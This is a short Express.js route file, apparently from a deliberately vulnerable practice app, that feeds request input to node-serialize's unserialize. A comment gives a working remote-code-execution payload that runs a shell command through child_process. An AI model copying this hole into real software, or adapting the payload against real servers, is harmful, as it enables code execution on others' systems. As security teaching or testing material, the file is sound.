const express = require('express');
const router = express.Router();
const serialize = require('node-serialize');

// Vulnerable to Insecure Deserialization
// Example: POST /deserialize with body: {"data":"_$$ND_FUNC$$_function(){require('child_process').exec('touch /tmp/pwned', function(err, stdout, stderr) { console.log(stdout) });}()"}
router.post('/deserialize', (req, res) => {
  const data = req.body.data;
  try {
    const obj = serialize.unserialize(data);
    res.send(`Deserialized object: ${JSON.stringify(obj)}`);
  } catch (e) {
    res.status(400).send('Invalid serialized object');
  }
});

module.exports = router;
